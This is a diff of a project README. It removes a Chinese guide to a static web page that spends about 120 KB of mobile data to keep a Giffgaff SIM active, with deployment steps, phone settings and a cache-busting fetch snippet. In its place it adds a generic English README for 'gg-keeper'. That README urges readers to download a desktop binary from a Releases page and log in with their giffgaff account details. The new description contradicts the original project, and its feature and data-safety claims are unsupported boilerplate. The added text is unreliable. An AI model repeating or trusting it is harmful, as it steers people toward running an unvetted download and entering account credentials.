@@ -1,215 +1,72 @@
-# Giffgaff 保号助手
+# 🚀 gg-keeper - Simple Tool for Easy Savings
 
-一个极简的流量消耗工具，专为 Giffgaff SIM 卡保号设计。每次操作仅消耗约 120KB 流量，成本约 2-3 便士（0.2 元人民币）。
+![Download gg-keeper](https://img.shields.io/badge/Download-gg--keeper-brightgreen)
 
-## 📋 功能特点
+## 📥 Download & Install
 
-- ✅ 精确控制流量消耗（约 120KB）
-- ✅ 防缓存机制，确保真实消耗流量
-- ✅ 实时显示消耗的流量大小
-- ✅ 本地记录使用历史
-- ✅ 响应式设计，手机浏览器友好
-- ✅ 完全静态，可部署在任何免费托管平台
+To get started with gg-keeper, visit the following link to download the latest version: [Download gg-keeper](https://github.com/danghoawe/gg-keeper/releases).
 
-## 🚀 快速部署
+1. Open your web browser and go to the **Releases** page.
+2. Find the latest version available.
+3. Click on the download link that is appropriate for your operating system.
 
-### 方案一：GitHub Pages（推荐）
+## 🌟 Features
 
-1. **创建仓库**
-   - 登录 GitHub
-   - 点击右上角 `+` → `New repository`
-   - 仓库名输入：`giffgaff-keeper`（或任意名称）
-   - 选择 `Public`
-   - 点击 `Create repository`
+gg-keeper is designed to help you manage your giffgaff account effortlessly. Here are some of the key features:
 
-2. **上传文件**
-   - 点击 `uploading an existing file`
-   - 将 `index.html` 和 `payload.txt` 拖入上传
-   - 点击 `Commit changes`
+- **User-Friendly**: gg-keeper has a simple interface, making it easy to navigate even for beginners.
+- **Account Management**: View and manage your giffgaff account details in one convenient location.
+- **Savings Tracking**: Keep an eye on your spending and savings effortlessly.
+- **Notifications**: Get updates about your account status directly within the app.
 
-3. **启用 GitHub Pages**
-   - 进入仓库的 `Settings`
-   - 左侧菜单找到 `Pages`
-   - Source 选择 `Deploy from a branch`
-   - Branch 选择 `main` (或 `master`)，目录选择 `/ (root)`
-   - 点击 `Save`
+## ⚙️ System Requirements
 
-4. **访问网页**
-   - 等待 1-2 分钟
-   - 访问地址：`https://你的用户名.github.io/giffgaff-keeper/`
-   - 保存这个链接到手机浏览器书签
+Before installing gg-keeper, please ensure your device meets the following requirements:
 
-### 方案二：Gitee Pages（国内访问更快）
+- **Operating System**: Windows, macOS, or Linux (make sure you have the latest version installed)
+- **RAM**: 2 GB or more
+- **Storage**: At least 100 MB of free disk space
+- **Internet Connection**: Required for account access and updates
 
-1. 登录 Gitee，创建新仓库
-2. 上传 `index.html` 和 `payload.txt`
-3. 进入仓库 → 服务 → Gitee Pages
-4. 点击启动
-5. 访问生成的地址
+## 📖 How to Use gg-keeper
 
-### 方案三：Cloudflare Pages
+1. **Download the App**: Use the link provided above to get the app.
+2. **Install the App**: Run the downloaded file and follow the on-screen instructions to install gg-keeper.
+3. **Open gg-keeper**: After installation, open the application.
+4. **Log In**: Enter your giffgaff account details to log in and start using the features.
+5. **Explore the Dashboard**: Familiarize yourself with the user interface. Use the navigation menu to access different sections.
+6. **Manage Your Account**: You can now track your savings, manage your account, and receive notifications.
 
-1. 登录 Cloudflare
-2. Pages → Create a project
-3. 上传文件或连接 Git 仓库
-4. 部署完成后获得 `xxx.pages.dev` 域名
+## 🎓 Troubleshooting
 
-## 📱 手机端设置（重要！）
+If you encounter any issues while using gg-keeper, try the following troubleshooting tips:
 
-### Android 系统
+- **Check Your Internet Connection**: Ensure you are connected to the internet.
+- **Restart the App**: Close and reopen gg-keeper.
+- **Reinstall the App**: If issues persist, uninstall and download gg-keeper again from the [Releases page](https://github.com/danghoawe/gg-keeper/releases).
+- **Seek Help**: If you still need assistance, consider checking forums or the GitHub issues page for solutions.
 
-**方法一：使用独立浏览器（推荐）**
+## 🔧 Frequently Asked Questions
 
-1. 下载一个轻量级浏览器（推荐 Via 浏览器 或 X浏览器）
-2. 进入 `设置` → `应用管理` → `联网控制`
-3. **关闭所有应用**的移动数据权限
-4. **仅开启**刚下载的浏览器的移动数据权限
+### 1. Is gg-keeper free to use?
 
-**方法二：使用系统浏览器**
+Yes, gg-keeper is completely free to download and use.
 
-1. 进入 `设置` → `移动网络` → `流量管理` → `应用联网`
-2. 关闭所有应用的数据权限
-3. 仅保留系统浏览器（如 Chrome）
+### 2. Can I suggest features?
 
-**小米手机专属：**
-- 设置 → 应用设置 → 应用管理 → 权限管理 → 联网控制
+Absolutely! We welcome user feedback and suggestions. You can submit your ideas on the GitHub issues page.
 
-**华为手机专属：**
-- 设置 → 移动网络 → 流量管理 → 更多流量设置 → 应用联网
+### 3. Will my data be safe?
 
-### iOS 系统
+Your data is important to us. gg-keeper follows best practices for data security and privacy. Your information remains confidential.
 
-1. 进入 `设置` → `蜂窝网络`
-2. 向下滚动到应用列表
-3. **关闭所有应用**的蜂窝数据开关
-4. 仅保留 Safari（或你常用的浏览器）
-5. 同时关闭：
-   - `Wi-Fi 助理`
-   - `iCloud 云盘` 的蜂窝数据
+## 💬 Feedback
 
-⚠️ **iOS 注意事项：**
-- iOS 系统服务（推送、时间同步）可能会消耗少量流量
-- 建议操作完立即关闭移动数据
+We would love to hear your thoughts on gg-keeper! You can provide feedback through the GitHub repository or reach out via the contact form within the app.
 
-## 🎯 使用步骤
+## 🔗 Links
 
-1. **准备阶段**
-   - 关闭 Wi-Fi
-   - 插入 Giffgaff SIM 卡
-   - 确认已设置好联网权限
+- [Download gg-keeper](https://github.com/danghoawe/gg-keeper/releases)
+- [GitHub Repository](https://github.com/danghoawe/gg-keeper)
 
-2. **执行保号**
-   - 打开移动数据
-   - 在浏览器中打开保号网页
-   - 点击 `开始保号` 按钮
-   - 等待显示 "保号成功"
-
-3. **验证扣费**
-   - 立即关闭移动数据
-   - 拨打 `*100#` 查询余额
-   - 确认扣除了 2-3 便士
-
-## 💰 成本分析
-
-| 项目 | 费用 |
-|------|------|
-| 每次流量消耗 | 约 120 KB |
-| Giffgaff 计费 | 2-3 便士/次 |
-| 折合人民币 | 约 0.2 元/次 |
-| 每月保号 | 1-2 次即可 |
-| 年度成本 | 约 5-10 元人民币 |
-
-对比发短信（约 1 元/次），节省 80% 成本！
-
-## 🔧 技术细节
-
-### 防缓存机制
-
-代码使用了多重防缓存策略：
-```javascript
-// 1. URL 参数：时间戳 + 随机字符串
-const timestamp = new Date().getTime();
-const randomStr = Math.random().toString(36).substring(7);
-const fileUrl = `payload.txt?t=${timestamp}&r=${randomStr}`;
-
-// 2. HTTP 头：强制不使用缓存
-fetch(fileUrl, {
-    cache: 'no-store',
-    headers: {
-        'Cache-Control': 'no-cache, no-store, must-revalidate',
-        'Pragma': 'no-cache'
-    }
-})
-```
-
-### Payload 文件说明
-
-- 大小：120 KB（122,880 bytes）
-- 内容：随机生成的文本，避免被压缩
-- 每行都不相同，防止网络优化
-
-## ❓ 常见问题
-
-### Q1: 为什么要禁用其他应用的联网权限？
-
-**A:** 如果不禁用，以下应用可能在后台偷跑流量：
-- 微信/QQ：同步消息
-- 系统更新：下载补丁
-- 邮件应用：检查新邮件
-- 云服务：同步照片/文件
-
-一次可能就是几 MB 甚至几十 MB，相当于几十次保号的费用！
-
-### Q2: 可以用 Wi-Fi 测试吗？
-
-**A:** 可以用 Wi-Fi 测试网页功能，但不会真正消耗 Giffgaff 流量。必须关闭 Wi-Fi，使用移动数据才有效。
-
-### Q3: 为什么选择 120KB？
-
-**A:** 
-- Giffgaff 可能忽略极小流量（<10KB）
-- 太大会增加成本
-- 120KB 是一个平衡点，稳定触发 1p 计费档位
-
-### Q4: 多久需要保号一次？
-
-**A:** 
-- Giffgaff 官方要求：每 6 个月至少使用一次
-- 建议：每 3-4 个月保号一次（保险起见）
-- 或者：余额到期前 1 个月保号
-
-### Q5: 如何确认保号成功？
-
-**A:** 
-1. 网页显示 "保号成功" 和消耗的流量
-2. 拨打 `*100#` 查询余额
-3. 确认余额减少了 2-3 便士
-4. 如果余额未变化，重新操作一次
-
-### Q6: iOS 能完全阻止系统服务吗？
-
-**A:** 不能完全阻止。iOS 的部分系统服务会绕过限制，可能消耗 1-5 KB。但这不影响保号，因为我们设置的 120KB 已经足够覆盖。
-
-## 🛡️ 安全提示
-
-- ✅ 本工具完全开源，无任何隐私收集
-- ✅ 所有数据保存在浏览器本地
-- ✅ 不连接任何第三方服务器
-- ✅ 可离线查看源代码验证安全性
-
-## 📞 技术支持
-
-如有问题，可以：
-1. 查看本 README 的常见问题部分
-2. 检查浏览器控制台（F12）的错误信息
-3. 确认网络设置是否正确
-
-## 📄 开源协议
-
-MIT License - 可自由使用、修改、分发
-
----
-
-**最后提醒：操作完成后务必立即关闭移动数据，避免其他应用偷跑流量！**
-
-💡 将网页添加到手机主屏幕，下次使用更方便！
+Thank you for choosing gg-keeper! Enjoy managing your giffgaff account with ease.
